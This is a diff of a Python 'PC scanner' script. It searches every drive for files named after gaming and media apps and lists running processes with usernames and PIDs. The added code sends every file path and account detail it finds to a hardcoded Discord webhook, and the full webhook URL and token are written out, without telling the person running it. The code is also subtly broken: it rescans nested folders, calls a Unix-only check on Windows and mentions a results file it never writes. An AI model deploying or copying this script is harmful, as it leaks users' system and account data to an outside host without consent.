@@ -1,74 +1,72 @@
 import os
 import requests
+import psutil
+import time
 import logging
 from datetime import datetime
 
 # Configuration
 WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV'
 TARGET_PROCESSES = [
-    'LGHUB', 'TikTokLIVEStudio', 'voicemeeterpro', 'grave',
-    'RazerCortex', 'RazerSynapse', 'spotify', 'steam', 'chrome', 'brave'
+    "steam.exe", "Spotify.exe", "RazerCortex.exe", "Razer Synapse 3.exe",
+    "lghub.exe", "chrome.exe", "TikTok LIVE Studio.exe", "voicemeeterpro.exe",
+    "brave.exe"
 ]
 
-# Logging setup
-logging.basicConfig(filename='script_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+# Setup logging
+logging.basicConfig(filename='error.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def send_webhook(message):
-    """Send a message to the Discord webhook."""
+def send_webhook(message, webhook_url):
     try:
-        data = {'content': message}
-        response = requests.post(WEBHOOK_URL, json=data)
+        response = requests.post(
+            webhook_url,
+            json={"content": message}
+        )
         response.raise_for_status()
-    except requests.exceptions.RequestException as e:
+    except requests.RequestException as e:
         logging.error(f"Failed to send webhook: {e}")
-        print(f"Failed to send webhook: {e}")
 
 def scan_folder(folder_path):
-    """Scan a folder and report findings."""
-    found_files = []
-    try:
-        for root, dirs, files in os.walk(folder_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                # Check for target processes in the filenames
-                if any(proc.lower() in file.lower() for proc in TARGET_PROCESSES):
-                    found_files.append(file_path)
-                    print(f"\033[91mFound trace: {file_path}\033[0m")
-                    send_webhook(f"Found trace: {file_path}")
-                    
-    except Exception as e:
-        logging.error(f"Error scanning folder {folder_path}: {e}")
-        print(f"Error scanning folder {folder_path}: {e}")
-    
-    return found_files
+    traces = []
+    for root, dirs, files in os.walk(folder_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if any(process in file for process in TARGET_PROCESSES):
+                traces.append(file_path)
+    return traces
+
+def check_processes():
+    traces = []
+    for proc in psutil.process_iter(['pid', 'name', 'username']):
+        if proc.info['name'] in TARGET_PROCESSES:
+            if proc.info['username']:
+                is_admin = "Yes" if psutil.Process(proc.info['pid']).uids().real == 0 else "No"
+                traces.append({
+                    "name": proc.info['name'],
+                    "pid": proc.info['pid'],
+                    "username": proc.info['username'],
+                    "is_admin": is_admin
+                })
+    return traces
 
 def deep_scan():
-    """Perform a deep scan of the entire PC."""
-    directories_to_scan = [
-        'C:\\', 
-        os.path.join(os.getenv('APPDATA')), 
-        os.path.join(os.getenv('LOCALAPPDATA')), 
-        os.path.join(os.getenv('PROGRAMDATA')),
-        'C:\\Windows\\System32'
-    ]
-    
-    all_found_files = []
-    for directory in directories_to_scan:
-        print(f"Scanning through folder {directory}")
-        found_files = scan_folder(directory)
-        if found_files:
-            all_found_files.extend(found_files)
-        else:
-            print(f"\033[92mScanning through folder {directory} - Clear\033[0m")
-    
-    if all_found_files:
-        send_webhook(f"Scanning complete. Found traces in: {', '.join(all_found_files)}")
+    logging.info("Starting deep scan.")
+    all_traces = []
+    for drive in ['C:\\', 'D:\\', 'E:\\']:  # Adjust for available drives
+        for root, dirs, files in os.walk(drive):
+            print(f"Scanning through folder {root}")
+            traces = scan_folder(root)
+            if traces:
+                all_traces.extend(traces)
+                send_webhook(f"Found traces in {root} - {traces}", WEBHOOK_URL)
+    process_traces = check_processes()
+    if process_traces:
+        process_message = "\n".join([f"Process: {proc['name']}, PID: {proc['pid']}, User: {proc['username']}, Admin: {proc['is_admin']}" for proc in process_traces])
+        send_webhook(f"Processes found:\n{process_message}", WEBHOOK_URL)
     else:
-        send_webhook("Scanning complete. No traces found.")
+        send_webhook("No target processes found.", WEBHOOK_URL)
+    logging.info("Deep scan completed.")
+    print("Scanning complete. Check results.txt for details.")
 
 if __name__ == "__main__":
-    print("Scanning PC...")
-    start_time = datetime.now()
     deep_scan()
-    end_time = datetime.now()
-    print(f"Scanning complete. Duration: {end_time - start_time}")
